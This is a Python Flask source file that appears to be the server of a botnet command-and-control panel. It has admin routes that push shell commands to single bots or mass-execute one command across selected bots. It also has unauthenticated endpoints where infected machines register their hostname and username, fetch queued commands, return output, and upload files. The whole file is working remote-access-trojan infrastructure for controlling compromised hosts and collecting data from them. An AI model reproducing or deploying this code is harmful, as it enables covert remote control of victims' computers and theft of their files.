import json
import base64
import os
from datetime import datetime
import tempfile
import shutil

from flask import Blueprint
from flask import request
from flask import abort
from flask import current_app
from flask import url_for
from flask import send_file
from flask import render_template
from werkzeug.utils import secure_filename
import pygeoip
from flask import flash
from flask import redirect
from flask import escape
import cgi

from UI import require_admin
from models import db
from models import Bot
from models import Command

Utilities = Blueprint('Utilities', __name__)

@Utilities.route('/<botid>/stdout')
@require_admin
def console(botid):
    bot = Bot.query.get(botid)
    return render_template('bot_console.html', bot=bot)


@Utilities.route('/<botid>/push', methods=['POST'])
@require_admin
def push_command(botid):
    bot = Bot.query.get(botid)
    if not bot:
        abort(404)
    bot.push_command(request.form['cmdline'])
    return ''


@Utilities.route('/<botid>/get_current_command', methods=['POST'])
def get_command(botid):
    bot = Bot.query.get(botid)
    if not bot:
        bot = Bot(botid)
        db.session.add(bot)
        db.session.commit()
    info = request.json
    if info:
        if 'hostname' in info:
            bot.hostname = info['hostname']
        if 'username' in info:
            bot.username = info['username']
    bot.last_online = datetime.now()
    bot.ip_address = request.remote_addr
    db.session.commit()
    command_to_run = ''
    cmd = bot.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        command_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return command_to_run


@Utilities.route('/<botid>/command_result', methods=['POST'])
def ouput_command(botid):
    bot = Bot.query.get(botid)
    if not bot:
        abort(404)
    output = request.form['output']
    bot.output += cgi.escape(output)
    db.session.add(bot)
    db.session.commit()
    return ''


@Utilities.route('/<bot_id>/upload', methods=['POST'])
def upload(bot_id):
    bot = Bot.query.get(bot_id)
    if not bot:
        abort(404)
    for file in request.files.values():
        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
        bot_dir = bot_id
        store_dir = os.path.join(upload_dir, bot_dir)
        filename = secure_filename(file.filename)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = "_" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('UI.uploads', path=bot_dir + '/' + filename)
        bot.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
        db.session.add(bot)
        db.session.commit()
    return ''


@Utilities.route('/massexec', methods=['POST'])
@require_admin
def mass_execute():
    selection = request.form.getlist('selection')
    if 'execute' in request.form:
        for bot_id in selection:
            Bot.query.get(bot_id).push_command(request.form['cmd'])
        flash('Executed "%s" on %s bots' % (request.form['cmd'], len(selection)))
    elif 'delete' in request.form:
        for bot_id in selection:
            db.session.delete(Bot.query.get(bot_id))
        db.session.commit()
        flash('Deleted %s bots' % len(selection))
    return redirect(url_for('UI.bot_list'))
